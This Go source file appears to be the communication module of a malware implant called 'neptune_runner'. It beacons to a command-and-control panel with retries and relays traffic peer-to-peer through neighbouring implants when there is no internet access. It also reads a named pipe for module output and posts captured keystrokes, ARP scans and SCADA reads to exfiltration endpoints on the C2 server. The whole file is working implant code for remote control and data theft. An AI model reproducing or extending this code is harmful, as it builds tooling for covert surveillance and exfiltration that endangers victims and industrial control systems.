package communication

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"gopkg.in/natefinch/npipe.v2"
	"io"
	"io/ioutil"
	"log"
	"neptune_runner/config"
	"neptune_runner/logging"
	"net"
	"net/http"
	"strings"
	"time"
)

func HttpGetRequest(apiPath string) ([]byte, error) {
	logging.Info("HTTP GET TO C2: " + apiPath)

	resp, err := http.Get(apiPath)

	if err != nil {
		return nil, err
	}

	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return nil, err
	}

	return body, nil
}

func HttpPostJsonRequest(apiPath string, data any) (map[string]interface{}, error) {
	logging.Info("HTTP POST TO C2: " + apiPath)

	jsonEncoded, err := json.Marshal(data)

	if err != nil {
		return nil, err
	}

	resp, err := http.Post(apiPath, "application/json", bytes.NewBuffer(jsonEncoded))

	if err != nil {
		return nil, err
	}

	var res map[string]interface{}

	err = json.NewDecoder(resp.Body).Decode(&res)

	if err != nil {
		return nil, err
	}

	return res, nil
}

func SendGetToC2Panel(apiPath string) []byte {
	if config.GlobalState.HaveInternetAccess() {
		var output []byte
		var err error

		output, err = HttpGetRequest(apiPath)

		numberOfRetries := 5
		counter := 0

		for err != nil && counter < numberOfRetries {
			counter++

			logging.Info("FAILED TO CONTACT C2. RETRYING...")
			time.Sleep(config.P2P_RETRY_TIMEOUT * time.Second)

			output, err = HttpGetRequest(apiPath)
		}

		if err != nil {
			logging.Info("CRITICAL ERROR: FAILED TO RELAY MESSAGE")

			return nil
		}

		//if debug.IsDebugEnabled() {
		//	fmt.Println(string(output))
		//}

		return output
	} else {
		structuredMessage := P2P_RELAY_STRUCTURE{
			BaseMessageFormat: BaseMessageFormat{
				MessageType: RELAY_GET_TO_C2,
				ImplantGUID: config.GlobalState.Id,
			},
			ApiPath: apiPath,
		}

		SendRequestViaRelay(structuredMessage)

		return nil
	}
}

func SendPostToC2Panel(apiPath string, data any) map[string]interface{} {
	if config.GlobalState.HaveInternetAccess() {
		var output map[string]interface{}
		var err error

		output, err = HttpPostJsonRequest(apiPath, data)

		numberOfRetries := 5
		counter := 0

		for err != nil && counter < numberOfRetries {
			counter++

			logging.Info("FAILED TO CONTACT C2. RETRYING...")
			time.Sleep(config.P2P_RETRY_TIMEOUT * time.Second)

			output, err = HttpPostJsonRequest(apiPath, data)
		}

		if err != nil {
			logging.Info("CRITICAL ERROR: FAILED TO RELAY MESSAGE")

			return nil
		}

		if logging.IsDebugEnabled() {
			fmt.Println(output)
		}

		return output
	} else {
		structuredMessage := P2P_RELAY_STRUCTURE{
			BaseMessageFormat: BaseMessageFormat{
				MessageType: RELAY_POST_TO_C2,
				ImplantGUID: config.GlobalState.Id,
			},
			ApiPath: apiPath,
			Data:    data,
		}

		SendRequestViaRelay(structuredMessage)

		return nil
	}
}

func SendRequestViaRelay(data P2P_RELAY_STRUCTURE) {
	jsonEncoded, _ := json.Marshal(data)

	relayImplant, ok := config.GlobalState.Neighbors[config.GlobalState.GetRelayImplant()]

	if !ok {
		logging.Info("Implant is not in the neighbors list")
	} else {
		logging.Info("Relayed communication to C2: " + data.ApiPath)

		relayImplant.SendBytes(jsonEncoded)
	}
}

func ReplyToTask(completedTask config.WrappedTaskStep) {
	if completedTask.TaskStepResponse.StatusId == -1 || completedTask.TaskStepResponse.Data == "" {
		logging.Info("TaskStepResponse not configured properly. Please update StatusId and Data fields")
		return
	}

	SendPostToC2Panel(completedTask.TaskStepResponse.ApiPath, completedTask.TaskStepResponse)
}

func ListenNamedPipe() {
	ln, err := npipe.Listen(`\\.\pipe\mypipe`)
	if err != nil {
		// handle error
	}

	for {
		conn, err := ln.Accept()
		if err != nil {
			// handle error
			continue
		}

		// handle connection like any other net.Conn
		go func(conn net.Conn) {
			r := bufio.NewReader(conn)
			msg, err := ioutil.ReadAll(r)
			if err != nil {
				// handle error
			}
			logging.Info(string(msg))
			ParseModuleOutput(msg)
		}(conn)
	}
}

func ParseModuleOutput(msg []byte) {
	msgType, msgContent, _ := strings.Cut(string(msg), " ")

	content := []byte(msgContent)

	fmt.Println("MessageType is:" + msgType)

	switch msgType {
	case "KL":
		apiPath := fmt.Sprintf(config.Config.Api.ExfilKeyloggingTemplate, config.GlobalState.Id)

		tempSendPostToC2Panel(apiPath, content)
	case "ARP":
		apiPath := fmt.Sprintf(config.Config.Api.ExfilArpTemplate, config.GlobalState.Id)

		tempSendPostToC2Panel(apiPath, content)
	case "SREAD":
		apiPath := fmt.Sprintf(config.Config.Api.ExfilSCADATemplate, config.GlobalState.Id)

		tempSendPostToC2Panel(apiPath, content)
	}
}

func tempSendPostToC2Panel(apiPath string, data []byte) {
	_, err := http.Post(apiPath, "application/json", bytes.NewBuffer(data))

	if err != nil {
		log.Fatal(err)
	}
}
